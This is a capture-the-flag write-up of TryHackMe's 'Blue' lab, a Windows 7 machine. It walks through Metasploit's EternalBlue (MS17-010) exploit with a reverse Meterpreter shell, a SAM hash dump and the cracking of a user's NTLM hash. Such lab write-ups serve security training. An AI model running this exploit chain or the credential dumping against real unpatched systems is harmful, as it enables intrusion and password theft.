# Blue — TryHackMe

## Info

| Field      | Details                          |
|------------|----------------------------------|
| Platform   | TryHackMe                        |
| Difficulty | Easy                             |
| OS         | Windows 7 Professional SP1 x64   |
| Topics     | EternalBlue, MS17-010, Metasploit, Password Cracking |

---

## Summary

Blue is a Windows 7 machine vulnerable to EternalBlue (MS17-010), one of the most notorious exploits in history — developed by the NSA and later leaked by Shadow Brokers. It was used in the WannaCry ransomware attack of 2017. The machine demonstrates how an unpatched SMB service leads to unauthenticated remote code execution and full SYSTEM access.

---

## Reconnaissance

### Full Port Scan

```
nmap -sS -p- -T4 <target-ip>
```

Running a full SYN scan first to discover all open ports before service detection, avoiding missed ports from a default scan.

**Open ports:** 135, 139, 445, 3389, 49152-49165

### Service Detection

```
nmap -sV -sC -p 135,139,445,3389,49152,49153,49154,49160,49165 <target-ip>
```

Key findings from the scan:

- **Port 445** — Windows SMB, running on **Windows 7 Professional 7601 Service Pack 1**
- **Port 3389** — RDP, certificate reveals hostname **Jon-PC** and user **Jon**
- **SMB signing disabled** — noted in Host script results, allows relay attacks
- **Guest account accepted** for SMB enumeration

The OS and SMB version immediately suggest MS17-010 (EternalBlue) as the attack vector. Windows 7 SP1 with SMB port 445 open is a classic EternalBlue target.

---

## Vulnerability Research

Searching `Windows 7 SP1 exploit` reveals **MS17-010 / EternalBlue** (CVE-2017-0144) as the primary vulnerability. It affects the SMBv1 protocol and allows unauthenticated remote code execution via a memory corruption bug in the Windows SMB server.

Key references:
- **CVE**: CVE-2017-0144
- **Microsoft Bulletin**: MS17-010
- **Exploit-DB**: #42031

---

## Exploitation

### Verifying Vulnerability

Before running the exploit, confirming the target is vulnerable using the Metasploit scanner module:

```
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <target-ip>
run
```

Result:
```
[+] Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
```

The scanner also confirms the architecture is **x64**, which is important for selecting the correct payload.

### Running the Exploit

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-ip>
set LHOST <tun0-ip>
run
```

The exploit attempts the EternalBlue memory corruption twice — the first attempt failed, the second succeeded:

```
[+] ETERNALBLUE overwrite completed successfully (0xC000000D)!
[+] WIN
[*] Meterpreter session 1 opened
```

A Meterpreter session opens automatically because the exploit's default payload is `windows/x64/meterpreter/reverse_tcp`.

---

## Post-Exploitation

### System Information

```
sysinfo
```

```
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1)
Architecture    : x64
Meterpreter     : x64/windows
```

```
getuid
```

```
Server username: NT AUTHORITY\SYSTEM
```

EternalBlue gives direct SYSTEM access — no privilege escalation needed. The exploit runs in the context of the SMB service which runs as SYSTEM.

### Shell to Meterpreter Conversion (Alternative Method)

If the initial shell is a basic cmd shell rather than Meterpreter, it can be upgraded using:

```
use post/multi/manage/shell_to_meterpreter
set SESSION <session-id>
run
```

### Process Migration

After gaining a Meterpreter session it is good practice to migrate to a more stable process running as SYSTEM to avoid session loss if the exploited process crashes:

```
ps
migrate <pid>
```

Target a stable SYSTEM process such as `spoolsv.exe` or `svchost.exe`. Migration ensures a persistent and stable session for post-exploitation activities.

### Verifying SYSTEM Access

```
getsystem
shell
whoami
```

```
nt authority\system
```

---

## Flags

Searching for flag files across the entire filesystem:

```
search -f flag*.txt
```

**Flag 1** — Root of C drive:
```
cat c:\\flag1.txt
flag{access_the_machine}
```

**Flag 2** — SAM database directory:
```
cat c:\\Windows\\System32\\config\\flag2.txt
flag{sam_database_elevated_access}
```

The location is significant — `System32\config` contains the SAM database where Windows stores password hashes. SYSTEM access is required to read files here.

**Flag 3** — User documents:
```
cat c:\\Users\\Jon\\Documents\\flag3.txt
flag{admin_documents_can_be_valuable}
```

---

## Credential Dumping

Dumping all password hashes from the SAM database:

```
hashdump
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

The non-default user is **Jon** (RID 1000). Administrator and Guest are built-in Windows accounts.

The hash format is `LM:NTLM`. The LM portion (`aad3b435b51404ee...`) is the same for all accounts — this is the hash for an empty LM password, meaning LM hashing is disabled. The NTLM hash for Jon is: `ffb43f0de35be4d9917ac0cc8ad57f8d`

### Cracking the Hash

```
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > jon.hash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt jon.hash
```

**Cracked password: `alqfna22`**

---

## What Failed / Dead Ends

- The first EternalBlue exploit attempt failed with `FAIL` before succeeding on the second attempt — this is normal behavior for this exploit as it relies on heap grooming which is not always deterministic on the first try.

---

## Key Takeaways

- Windows 7 SP1 with port 445 open and SMBv1 enabled is immediately suspicious — EternalBlue should always be the first thing to check.
- EternalBlue gives SYSTEM directly — no privilege escalation step needed, which is why it was so dangerous in the wild.
- `hashdump` requires SYSTEM privileges — always verify `getuid` before attempting it.
- The LM hash `aad3b435b51404eeaad3b435b51404ee` appearing for all accounts indicates LM hashing is disabled, leaving only the NTLM hash to crack.
- Process migration stabilizes the session and prevents losing access if the exploited process is restarted.
